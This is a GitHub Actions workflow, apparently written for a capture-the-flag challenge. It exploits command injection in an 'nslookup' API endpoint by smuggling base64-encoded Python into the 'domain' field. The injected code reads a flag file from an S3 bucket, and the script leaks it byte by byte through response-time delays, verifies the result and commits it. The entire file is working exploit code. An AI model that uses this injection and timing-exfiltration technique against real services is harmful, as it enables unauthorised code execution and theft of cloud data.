name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Extract nibbles and verify inline
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          run_timed() {
            local label=$1
            local b64=$2
            local INJ="x; echo $b64 | base64 -d | python3 #"
            local t0=$(date +%s%3N)
            curl -s -X POST "$URL" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
            local t1=$(date +%s%3N)
            local dt=$((t1-t0))
            echo "$label ${dt}ms"
            echo "$label ${dt}ms" >> nibbles2.txt
          }

          echo "# nibble extraction run $(date -u)" > nibbles2.txt

          for i in $(seq 0 15); do
            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]>>4)"
            run_timed "hi${i}" "$(echo -n "$PY" | base64 -w0)"
          done

          for i in $(seq 0 15); do
            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]&0xF)"
            run_timed "lo${i}" "$(echo -n "$PY" | base64 -w0)"
          done

          # Analyze locally: overhead from bytes 3,8,12 (confirmed hi=7 from Phase2HI)
          ANALYSIS=$(python3 -c "
          timings = {}
          for line in open('nibbles2.txt'):
              p = line.strip().split()
              if len(p) == 2:
                  timings[p[0]] = int(p[1].replace('ms',''))
          hi3 = timings.get('hi3', 9000)
          hi8 = timings.get('hi8', 9000)
          hi12 = timings.get('hi12', 9000)
          overhead = (hi3 - 7000 + hi8 - 7000 + hi12 - 7000) / 3
          flag_bytes = []
          for i in range(16):
              hi = max(0, min(15, round((timings.get('hi'+str(i), overhead) - overhead) / 1000)))
              lo = max(0, min(15, round((timings.get('lo'+str(i), overhead) - overhead) / 1000)))
              flag_bytes.append((hi << 4) | lo)
          flag_hex = ''.join('{:02x}'.format(b) for b in flag_bytes)
          flag_ascii = ''.join(chr(b) if 32<=b<=126 else '.' for b in flag_bytes)
          print('OVERHEAD=' + str(round(overhead)))
          print('FLAG_HEX=' + flag_hex)
          print('FLAG_ASCII=' + flag_ascii)
          ")
          echo "$ANALYSIS"

          FLAG_HEX=$(echo "$ANALYSIS" | grep FLAG_HEX | cut -d= -f2)
          FLAG_ASCII=$(echo "$ANALYSIS" | grep FLAG_ASCII | cut -d= -f2)
          echo "Computed flag: $FLAG_ASCII ($FLAG_HEX)"

          # Immediately verify the computed flag
          PY_CMP="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(10 if flag==bytes.fromhex('${FLAG_HEX}') else 2)"
          B64_CMP=$(echo -n "$PY_CMP" | base64 -w0)

          echo "# verify run $(date -u)" > verify2.txt
          echo "FLAG_HEX=$FLAG_HEX" >> verify2.txt
          echo "FLAG_ASCII=$FLAG_ASCII" >> verify2.txt
          run_timed "verify" "$B64_CMP"

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add nibbles2.txt verify2.txt
          git commit -m "re-extract + inline verify" || echo "Nothing to commit"
          git push origin corgi
